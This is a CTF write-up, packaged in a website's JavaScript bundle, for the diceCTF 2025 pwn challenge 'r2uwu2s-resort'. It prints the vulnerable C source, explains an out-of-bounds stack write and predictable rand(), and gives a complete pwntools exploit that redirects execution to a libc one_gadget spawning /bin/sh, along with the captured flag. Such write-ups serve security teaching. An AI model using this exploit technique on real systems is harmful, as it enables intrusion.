"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2953],{2480:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>o,contentTitle:()=>d,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"ctf-writeups/dicectf-2025/r2uwu2s-resort","title":"r2uwu2s-resort","description":" ","source":"@site/pwn/ctf-writeups/dicectf-2025/r2uwu2s-resort.md","sourceDirName":"ctf-writeups/dicectf-2025","slug":"/ctf-writeups/dicectf-2025/r2uwu2s-resort","permalink":"/pwn/ctf-writeups/dicectf-2025/r2uwu2s-resort","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"description":" ","sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"diceCTF 2025","permalink":"/pwn/category/dicectf-2025"},"next":{"title":"locked room","permalink":"/pwn/ctf-writeups/dicectf-2025/locked-room"}}');var t=i(4848),r=i(8453);const a={description:" ",sidebar_position:1},d="r2uwu2s-resort",o={},l=[{value:"Reversing",id:"reversing",level:2},{value:"Checksec",id:"checksec",level:3},{value:"PIE Leak",id:"pie-leak",level:3},{value:"(B)OOB: (Bunny) Out of Bounds",id:"boob-bunny-out-of-bounds",level:3},{value:"Exploitation",id:"exploitation",level:2},{value:"Predicting rand",id:"predicting-rand",level:3},{value:"Immortality?",id:"immortality",level:3},{value:"The plan",id:"the-plan",level:3},{value:"Implementation",id:"implementation",level:3},{value:"Exploit",id:"exploit",level:2}];function c(e){const n={a:"a",admonition:"admonition",br:"br",code:"code",del:"del",em:"em",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"r2uwu2s-resort",children:"r2uwu2s-resort"})}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (214).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"r2uwu2s-resort"})," was the easy pwn challenge from this year's diceCTF. While I didn't look much at this challenge during the CTF (as it was released later on, and I was focused on ",(0,t.jsx)(n.a,{href:"locked-room",children:"locked_room"}),"), I did look at it after the CTF and locked_room, and solved it, so here's my writeup for it."]}),"\n",(0,t.jsx)(n.h2,{id:"reversing",children:"Reversing"}),"\n",(0,t.jsx)(n.h3,{id:"checksec",children:"Checksec"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (215).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["Full protections on ",(0,t.jsx)("code",{children:"resort"})]})})]}),"\n",(0,t.jsx)(n.p,{children:"It wouldn't be a diceCTF challenge if it were missing any proections (except FORTIFY, but who actually cares about that). We're also given source code:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <time.h>\n#include <unistd.h>\n\n#define ANSI_RESET "\\x1b[0m"\n#define ANSI_COLOR(x) "\\x1b[0;" x "m"\n#define ANSI_RED ANSI_COLOR("31")\n#define ANSI_GREEN ANSI_COLOR("32")\n#define ANSI_YELLOW ANSI_COLOR("33")\n#define ANSI_BLUE ANSI_COLOR("34")\n#define ANSI_MAGENTA ANSI_COLOR("35")\n#define ANSI_CYAN ANSI_COLOR("36")\n#define ANSI_WHITE ANSI_COLOR("37")\n#define ANSI_BRIGHT_RED ANSI_COLOR("91")\n#define ANSI_BRIGHT_GREEN ANSI_COLOR("92")\n#define ANSI_BRIGHT_YELLOW ANSI_COLOR("93")\n#define ANSI_BRIGHT_BLUE ANSI_COLOR("94")\n#define ANSI_BRIGHT_MAGENTA ANSI_COLOR("95")\n#define ANSI_BRIGHT_CYAN ANSI_COLOR("96")\n#define ANSI_BRIGHT_WHITE ANSI_COLOR("97")\n#define ANSI_ERASE "\\x1b[2J"\n\n#define sleep_ms(x) usleep(x * 1000)\n\ntypedef struct {\n  int8_t hp;\n} dustbunny;\n\nvoid print_bunny(dustbunny* bunny, char paw) {\n  if (bunny->hp > 50) {\n    printf("%1$c{ ^^ }%1$c", paw);\n  } else if (bunny->hp > 0) {\n    printf("%1$c{ oo }%1$c", paw);\n  } else {\n    printf("%1$c{ xx }%1$c", paw);\n  }\n}\n\nvoid print_ui(char* msg, dustbunny bunnies[static 3], uint8_t hp, uint8_t mp) {\n  printf(\n    ANSI_BRIGHT_RED \\\n    "                                        \\n" \\\n    "  +==================================+  \\n" \\\n    "  |                                  |  \\n" \\\n    "  | "\n  );\n  printf("%-32s", msg);\n  printf(\n    " |  \\n" \\\n    "  |                                  |  \\n" \\\n    "  |     "\n  );\n  print_bunny(&bunnies[0], \'*\');\n  print_bunny(&bunnies[1], \'\\\'\');\n  print_bunny(&bunnies[2], \'.\');\n  printf(\n    "     |  \\n" \\\n    "  |                                  |  \\n" \\\n    "  +==================================+  \\n" \\\n    "  |                                  |  \\n" \\\n    "  | r2uwu2 @ "\n  );\n  printf("%-23p", &print_ui);\n  printf(\n    " |  \\n" \\\n    "  | ------ HP ["\n  );\n  for (uint8_t i = 0; i < 20; i++) {\n    printf(i < hp / 5 ? "#" : " ");\n  }\n  printf(\n    "] |  \\n" \\\n    "  |        MP ["\n  );\n  for (uint8_t i = 0; i < 20; i++) {\n    printf(i < mp / 5 ? "*" : " ");\n  }\n  printf(\n    "] |  \\n" \\\n    "  |                                  |  \\n" \\\n    "  +==================================+  \\n" \\\n    "                                        \\n" \\\n    ANSI_RESET\n  );\n}\n\nchar* items[] = {\n  "random bs",\n  "spooky rizz",\n  "dr chatterjee",\n  "DOM CLOBBERING",\n};\n\nint main() {\n  dustbunny bunnies[3] = {\n    {\n      .hp = 96,\n    },\n    {\n      .hp = 99,\n    },\n    {\n      .hp = 97,\n    }\n  };\n  uint8_t hp = 100;\n  uint8_t mp = 100;\n\n  char msg[33] = "3 Dust Bunnies block your path! ";\n  while (true) {\n    print_ui(msg, bunnies, hp, mp);\n\n    int item = rand() % 4;\n    int choice;\n    printf("Attack with [%s] against which bunny? (1-3) > ", items[item]);\n    fflush(stdout);\n    if (scanf("%d%*[^\\n]", &choice) == 0) {\n      puts("bad input >:(");\n      fflush(stdout);\n      return 1;\n    }\n\n    uint8_t dmg;\n    if (item == 3) {\n      bunnies[choice - 1].hp = 0;\n    } else {\n      dmg = rand() % 255;\n      bunnies[choice - 1].hp -= dmg;\n    }\n\n    hp -= 1;\n    if (bunnies[choice - 1].hp <= 0) {\n      sprintf(msg, "Bunny %d has fallen!", choice);\n    } else {\n      sprintf(msg, "Bunny %d took %d damage!", choice, dmg);\n    }\n\n    if (bunnies[0].hp <= 0 && bunnies[1].hp <= 0 && bunnies[2].hp <= 0) {\n      puts("r2uwu2 wins!");\n      fflush(stdout);\n      return 0;\n    } else if (hp < 0) {\n      puts("the resort wins...");\n      fflush(stdout);\n      return 1;\n    }\n  }\n}\n'})}),"\n",(0,t.jsxs)(n.p,{children:["The program seems to be a kind of turn based singler player game, where we have to defeat 3 bunnies (it's mean ","\ud83d\ude22",', but anything for a flag) by selecting one each turn, then we do a "random" (more on this later) amount of damage to it, or have a \xbc chance to kill it insantly (i.e reduce its ',(0,t.jsx)(n.code,{children:".hp"})," to 0). Each bunny is of type ",(0,t.jsx)(n.code,{children:"dustbunny"}),", which is just:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:"typedef struct {\n  int8_t hp;\n} dustbunny;\n"})}),"\n",(0,t.jsxs)(n.p,{children:["So basically just a ",(0,t.jsx)(n.code,{children:"int8_t"})," (i.e. a one byte value)."]}),"\n",(0,t.jsx)(n.p,{children:"The program ends when either all the bunnies die, or we do."}),"\n",(0,t.jsx)(n.h3,{id:"pie-leak",children:"PIE Leak"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'printf("%-23p", &print_ui);\n'})}),"\n",(0,t.jsxs)(n.p,{children:["Even though we have PIE enabled, the challenge decides to give us a PIE leak for free anyways, how nice of them! ",(0,t.jsx)(n.del,{children:"why they simply didn't just disable PIE is beyond me"}),"."]}),"\n",(0,t.jsx)(n.h3,{id:"boob-bunny-out-of-bounds",children:"(B)OOB: (Bunny) Out of Bounds"}),"\n",(0,t.jsxs)(n.p,{children:['The bug here is fairly obvious: no bounds check on which bunny we decide to attack. This means we can subtract "random" values from arbitrary ',(0,t.jsx)(n.code,{children:"int8_t"}),"s on the stack, however since we can't control the output of ",(0,t.jsx)(n.code,{children:"rand()"}),", how do we control this OOB?"]}),"\n",(0,t.jsx)(n.h2,{id:"exploitation",children:"Exploitation"}),"\n",(0,t.jsx)(n.h3,{id:"predicting-rand",children:"Predicting rand"}),"\n",(0,t.jsxs)(n.p,{children:["If we can't control the values we subtract, then the next best thing is to be able to predict them, so when a useful value comes along, we can use it for a specific write to some index. Thankfully, ",(0,t.jsx)(n.code,{children:"rand"})," isn't as random as you may expect.",(0,t.jsx)(n.br,{}),"\n",(0,t.jsx)(n.code,{children:"rand"})," is a pseudo-random generator, which means the numbers aren't truly random, and just appear to be so. These tend to work by applying mathematical operations to a current state to yield a new one, so they're deterministic, ",(0,t.jsx)(n.em,{children:"and"})," they need a starting seed value to determine an initial state. Importantly, this means if we know the initial seed, we can predict all the generated numbers."]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"rand"})," uses ",(0,t.jsx)(n.code,{children:"srand"})," to seed it, and a common pattern is doing ",(0,t.jsx)(n.code,{children:"srand(time(NULL))"})," at the start of programs, which seeds based on the current time, however there is no call to ",(0,t.jsx)(n.code,{children:"srand"})," at all in the program!"]}),"\n",(0,t.jsxs)(n.p,{children:["By default, ",(0,t.jsx)(n.code,{children:"rand"})," is seeded with ",(0,t.jsx)(n.code,{children:"0"}),", so we can generate all the attacks:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'import ctypes\ndll = ctypes.CDLL("libc.so.6")\n#dll.srand(0)    # if you want to be safe\n\ndef attack_gen():\n    while True:\n        item = dll.rand() % 4\n        dmg = None\n        if item != 3:\n            dmg = -(dll.rand() % 255)\n        yield (item, dmg)\n'})}),"\n",(0,t.jsx)(n.h3,{id:"immortality",children:"Immortality?"}),"\n",(0,t.jsxs)(n.p,{children:["Another limitation to get around is our ",(0,t.jsx)(n.code,{children:"hp"}),". ",(0,t.jsx)(n.code,{children:"hp"})," starts at 100, and goes down by 1 every turn, so we'd only have roughly 100 writes. Since we don't have controlled writes, many of those 100 won't be useful to us, at least not easily, plus the address randomization potentially decreasing reliability of finding the necessary writes."]}),"\n",(0,t.jsxs)(n.p,{children:["So what if we used our OOB to hit ",(0,t.jsx)(n.code,{children:"hp"}),"?"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (217).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:"hp = 100"})})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (218).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:"hp -= 1"})})})]}),"\n",(0,t.jsxs)(n.p,{children:["Unfortunately no good, because ",(0,t.jsx)(n.code,{children:"hp"})," is stored in the register ",(0,t.jsx)(n.code,{children:"r12"}),"!"]}),"\n",(0,t.jsxs)(n.p,{children:["However, it turns out we actually don't need to worry about this at all! If we take a closer look at how ",(0,t.jsx)(n.code,{children:"hp"})," is defined, we see that it's actually unsigned: ",(0,t.jsx)(n.code,{children:"uint8_t hp = 100;"}),". And since the check is for ",(0,t.jsx)(n.code,{children:"hp < 0"}),", NOT ",(0,t.jsx)(n.code,{children:"hp <= 0"})," like with the bunnies, this will NEVER pass."]}),"\n",(0,t.jsx)(n.p,{children:"In fact, the compiler recognises this, and just removes this check entirely:"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (220).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:'No "the resort wins" string'})})]}),"\n",(0,t.jsx)(n.h3,{id:"the-plan",children:"The plan"}),"\n",(0,t.jsxs)(n.p,{children:["Since we have only a PIE leak (no libc), we can only write PIE addresses, so our attack options are limited. Ideally we'd want to attack the return address, which already has a libc address: ",(0,t.jsx)(n.code,{children:"__libc_start_call_main+128"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"While we don't have a libc leak, we do have a subtract primitive as opposed to just a write one, so we can use this to our advantage!"}),"\n",(0,t.jsxs)(n.p,{children:["We don't need to know all the bits of the address, we just need to know the offset from the address to where we'd want to jump, most likely a ",(0,t.jsx)(n.code,{children:"one_gadget"}),", then we can subtract from each byte to effectively subtract that offset!"]}),"\n",(0,t.jsx)(n.admonition,{type:"caution",children:(0,t.jsx)(n.p,{children:"This isn't perfect, as this won't account for possible carrying that may be needed, depending on the libc base, but it will work well enough in practice."})}),"\n",(0,t.jsxs)(n.p,{children:["So, what ",(0,t.jsx)(n.code,{children:"one_gadget"}),"s do we have?"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (221).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:"one_gadget libc.so.6"})})})]}),"\n",(0,t.jsxs)(n.p,{children:["And this is the state of the registers on returning from ",(0,t.jsx)(n.code,{children:"main"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (222).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["return from ",(0,t.jsx)("code",{children:"main"})]})})]}),"\n",(0,t.jsxs)(n.p,{children:["The biggest thing to note is that none of these gadgets will work, because ",(0,t.jsx)(n.code,{children:"rbp-0xXX"})," needs to be writable, and ",(0,t.jsx)(n.code,{children:"rbp=1"}),". So if we're going to use a ",(0,t.jsx)(n.code,{children:"one_gadget"}),", we will need to change ",(0,t.jsx)(n.code,{children:"rbp"})," to some writable address, like a PIE one. We can do this by writing to the stack, as ",(0,t.jsx)(n.code,{children:"rbp"})," is saved at the start of ",(0,t.jsx)(n.code,{children:"main"}),", and restored at the end along with ",(0,t.jsx)(n.code,{children:"r12-r15"})," and ",(0,t.jsx)(n.code,{children:"rbx"}),"."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (223).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"Restore saved registers"})})]}),"\n",(0,t.jsx)(n.p,{children:"However with many of these gadgets, we'll need to fix other constraints too, except for 2 of them:"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (224).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:"r10 == NULL"})})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (225).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:"rax == NULL"})})})]}),"\n",(0,t.jsxs)(n.p,{children:["While ",(0,t.jsx)(n.code,{children:"r10 == NULL"})," happens by chance (probably from some system call), we can see that ",(0,t.jsx)(n.code,{children:"rax == NULL"})," comes from the ",(0,t.jsx)(n.code,{children:"return 0;"}),". So all these gadgets need is a valid, writable ",(0,t.jsx)(n.code,{children:"rbp"}),", which we can use ",(0,t.jsx)(n.code,{children:"PIE+0x4100"})," for."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (228).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:"PIE+0x4100"})})})]}),"\n",(0,t.jsx)(n.p,{children:"So the plan is:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["Overwrite saved rbp to point to ",(0,t.jsx)(n.code,{children:"PIE+0x4100"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:["Overwrite return address to point to a ",(0,t.jsx)(n.code,{children:"one_gadget"}),"."]}),"\n",(0,t.jsxs)(n.li,{children:["Kill the 3 bunnies to return, and trigger the ",(0,t.jsx)(n.code,{children:"one_gadget"}),"."]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"implementation",children:"Implementation"}),"\n",(0,t.jsx)(n.p,{children:"Now let's implement the attack:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'attacks = attack_gen()\n\ndef do_subs(subs):\n    payload = ""\n    while subs:\n        item, dmg = next(attacks)\n        if item == 3:\n            payload += "0\\n"\n            continue\n        for i in range(len(subs)):\n            sub, off = subs[i]\n            if sub == abs(dmg):\n                payload += str(off+1) + "\\n"\n                subs.pop(i)\n                break\n        else:\n            payload += "0\\n"\n    return payload\n\ndef gen_subs(after, before, off):\n    assert len(before) == len(after)\n    subs = []\n    for i, (a, b) in enumerate(zip(after, before)):\n        if a == b:\n            continue\n        subs.append(((b-a) % 256, off+i))\n    return subs\n\ndef kill_bunnies():\n    payload = ""\n    i = 0\n    while i < 3:\n        item, dmg = next(attacks)\n        if item == 3 or dmg >= [96, 99, 97][i]:\n            payload += str(i+1)+"\\n"\n            i += 1\n        else:\n            payload += "0\\n"\n    return payload\n\none_gadget = p64(0xebd43)[:3]\nret = p64(libc.sym.__libc_start_call_main+128)[:3]\n\nsubs = []\nsubs += gen_subs(one_gadget, ret, 0x6c)\nsubs += gen_subs(p64(e.address + 0x4101), p64(1), 0x64)\n\npayload = do_subs(subs) + kill_bunnies()\np.send(payload.encode())\np.recvuntil(b"r2uwu2 wins!")\np.interactive()\n'})}),"\n",(0,t.jsxs)(n.p,{children:["Since our write primitive is a subtraction, we either need to know the current value of what we're overwriting, or set it to 0 first using ",(0,t.jsx)(n.code,{children:"DOM CLOBBERING"})," (which we don't need to use as we know the values)."]}),"\n",(0,t.jsxs)(n.p,{children:["So what ",(0,t.jsx)(n.code,{children:"gen_subs"})," does is generate a list of what values should be subtracted from each index, and we generate this for the ",(0,t.jsx)(n.code,{children:"one_gadget"})," and ",(0,t.jsx)(n.code,{children:"saved rbp"})," writes."]}),"\n",(0,t.jsxs)(n.p,{children:["Then ",(0,t.jsx)(n.code,{children:"do_subs"})," will generate the payload to do these, in no particular order, as these writes don't have an effect until we return. If we have an attack that's useless to us, we send it to an irrelevant index, like ",(0,t.jsx)(n.code,{children:"-1"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["Finally we need to return, so then we kill the 3 bunnies (RIP ","\ud83d\ude22",") by bringing their hp to 0 or lower."]}),"\n",(0,t.jsx)(n.h2,{id:"exploit",children:"Exploit"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",metastring:"showLineNumbers",children:'#!/usr/bin/python3\nfrom pwn import *\nfrom sys import argv\nimport ctypes\n\ne = context.binary = ELF(\'./resort_patched\')\nlibc = ELF(\'./libc.so.6\', checksec=False)\nld = ELF(\'./ld-linux-x86-64.so.2\', checksec=False)\nif args.REMOTE:\n    ip, port = "dicec.tf", 32030\n    conn = lambda: remote(ip, port)\nelse:\n    conn = lambda: e.process()\n\ndll = ctypes.CDLL("libc.so.6")\n\np = conn()\n\np.recvuntil(b"r2uwu2 @ ")\nprint_ui = int(p.recvuntil(b" "), 16)\nlog.info(f"print_ui: {hex(print_ui)}")\n\ne.address = print_ui - e.sym.print_ui\nlog.info(f"PIE: {hex(e.address)}")\n\ndef attack_gen():\n    while True:\n        item = dll.rand() % 4\n        dmg = None\n        if item != 3:\n            dmg = -(dll.rand() % 255)\n        yield (item, dmg)\n\nattacks = attack_gen()\n\ndef do_subs(subs):\n    payload = ""\n    while subs:\n        item, dmg = next(attacks)\n        if item == 3:\n            payload += "0\\n"\n            continue\n        for i in range(len(subs)):\n            sub, off = subs[i]\n            if sub == abs(dmg):\n                payload += str(off+1) + "\\n"\n                subs.pop(i)\n                break\n        else:\n            payload += "0\\n"\n    return payload\n\ndef gen_subs(after, before, off):\n    assert len(before) == len(after)\n    subs = []\n    for i, (a, b) in enumerate(zip(after, before)):\n        if a == b:\n            continue\n        subs.append(((b-a) % 256, off+i))\n    return subs\n\ndef kill_bunnies():\n    payload = ""\n    i = 0\n    while i < 3:\n        item, dmg = next(attacks)\n        if item == 3 or dmg >= [96, 99, 97][i]:\n            payload += str(i+1)+"\\n"\n            i += 1\n        else:\n            payload += "0\\n"\n    return payload\n\n"""\n0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])\nconstraints:\n  address rbp-0x50 is writable\n  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv\n  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp\n"""\n\none_gadget = p64(0xebd43)[:3]\nret = p64(libc.sym.__libc_start_call_main+128)[:3]\n\nsubs = []\nsubs += gen_subs(one_gadget, ret, 0x6c)\nsubs += gen_subs(p64(e.address + 0x4101), p64(1), 0x64)\n\npayload = do_subs(subs) + kill_bunnies()\n\nprint(len(payload))\np.send(payload.encode())\np.recvuntil(b"r2uwu2 wins!")\np.interactive()\n'})}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (229).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"Getting the flag"})})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"dice{clearing_the_dust_with_the_power_of_segmentation_fault_core_dumped_ae1f9557}"})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},8453:(e,n,i)=>{i.d(n,{R:()=>a,x:()=>d});var s=i(6540);const t={},r=s.createContext(t);function a(e){const n=s.useContext(r);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);